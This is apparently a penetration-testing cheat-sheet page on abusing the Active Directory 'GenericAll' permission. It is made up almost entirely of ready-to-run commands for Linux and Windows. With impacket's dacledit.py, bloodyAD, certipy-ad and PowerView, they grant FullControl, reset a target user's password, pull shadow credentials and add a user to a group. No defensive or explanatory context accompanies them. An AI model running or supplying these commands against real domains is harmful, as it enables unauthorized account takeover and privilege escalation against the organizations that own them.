---
title: "GenericAll"
date: 2024-7-12
tags: ["GenericAll", "active driectory", "ad", "Windows", "shadow credentials"]
---

### Abuse #1: Change target user password

{{< tab set1 tab1 active >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 0. Install latest impacket (included dacledit.py)

```console
git clone https://github.com/fortra/impacket.git
```

```console
cd impacket
```

```console
pip3 install .
```

#### 1. Add Full Control to current user

```console
dacledit.py -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal <USER> -target-dn 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' -inheritance -action write -rights FullControl
```

#### 2. Change password

{{< tab set1-1 tab1 active >}}bloodyAD{{< /tab >}}
{{< tabcontent set1-1 tab1 >}}

```console
python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> set password <TARGET_USER> <NEW_PASSWORD>
```

<small>*Ref: [bloodyAD](https://github.com/CravateRouge/bloodyAD)*</small>

{{< /tabcontent >}}
{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Import PowerView.ps1 

```console
. .\PowerView.ps1
```

#### 2. Change target user password

```console
$password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force 
```

```console
Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $password
```

{{< /tabcontent >}}

---

### Abuse #2: Get shadow credentials

{{< tab set3 tab1 active >}}Linux{{< /tab >}}
{{< tabcontent set3 tab1 >}}

#### 0. Install latest impacket (included dacledit.py)

```console
git clone https://github.com/fortra/impacket.git
```

```console
cd impacket
```

```console
pip3 install .
```

#### 1. Add Full Control to current user

```console
dacledit.py -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal <USER> -target-dn 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' -inheritance -action write -rights FullControl
```

#### 2. Get shadow credentials

```console
sudo ntpdate -s <DC> && certipy-ad shadow auto -username <USERNAME>@<DOMAIN> -password '<PASSWORD>' -k -account <TARGET_USER> -target <DC>
```

{{< /tabcontent >}}

---

### Abuse #3 : Add user to group

{{< tab set4 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set4 tab1 >}}

#### 1. Import PowerView
```console
. .\PowerView.ps1
```

#### 2. Create a cred object (runas) \[optional\]

```console
$username = '<DOMAIN>\<USER>'
```

```console
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
```

```console
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

#### 2. Add user to group

```console
Add-DomainGroupMember -Identity <TARGET_GROUP> -Members <USER> -Credential $cred
```

{{< /tabcontent >}}
